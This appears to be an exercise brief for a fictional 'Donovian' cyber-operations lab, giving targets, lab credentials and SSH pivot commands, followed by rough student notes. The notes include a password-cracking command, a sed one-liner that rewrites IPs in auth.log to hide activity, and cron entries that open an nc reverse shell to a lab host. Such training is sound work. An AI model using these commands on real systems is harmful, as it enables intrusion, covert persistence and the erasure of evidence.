onovian Linux Privilege Escalation, and Persistence (DLP)
XX Feb 2027
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Linux hosts.

Tools/Techniques: SSH masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Linux techniques to gain privileged access and persist are limited to host misconfigurations, open suid/sgid, weak permissions, and path. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = H@RDl1nux5t@rt0F@ct1v1ty

Prior Approvals: Privilege escalation, persistence, and restarting of services through host reboot. Host survey and log sanitation utilizing native command shells, which shell is at discretion of student. NOT authorized is uploading of tools or altering account information.

Scheme of Maneuver:
>10.50.39.150
->Pivot:192.168.28.105
--->T1: 192.168.28.27
--->T2: 192.168.28.12
ssh student@10.50.39.150 -L 10300:192.168.28.105:2222
ssh comrade@localhost -p 10300 -L 10301:192.168.28.27:22
ssh comrade@localhost -p 10300 -D 9050

scp 

Target Section:

Pivot
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
PSP: rkhunter
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: unknown
IP: 192.168.28.27
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

T2
Hostname: lin1:internal.donovia
IP: 192.168.28.12
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
https://www.the-art-of-web.com/system/rsyslog-config/

john [FILE] --wordlist=[wordlist]
1f6a18d981eef6e


usacys@workstation07:~/Downloads$ grep -rl auth /home/usacys/Downloads/auth.log | xargs sed -i 's/172.16.4.6/192.168.1.103/g'
usacys@workstation07:~/Downloads$ cat auth.log | grep 172
Mar 11 10:15:30 localhost sshd[7172]: Connection closed by authenticating user billybob 192.168.1.115 port 51098 [preauth]
usacys@workstation07:~/Downloads$ md5sum auth.log 
bbe9a512fe8a20773081fdf164a56997  auth.log





9771390 - 

*/1 * * * * nc 192.168.28.135 33403 -e /bin/bash #var/spool/crontabs
*/1 * * * * root nc 192.168.28.135 33403 -e /bin/bash 

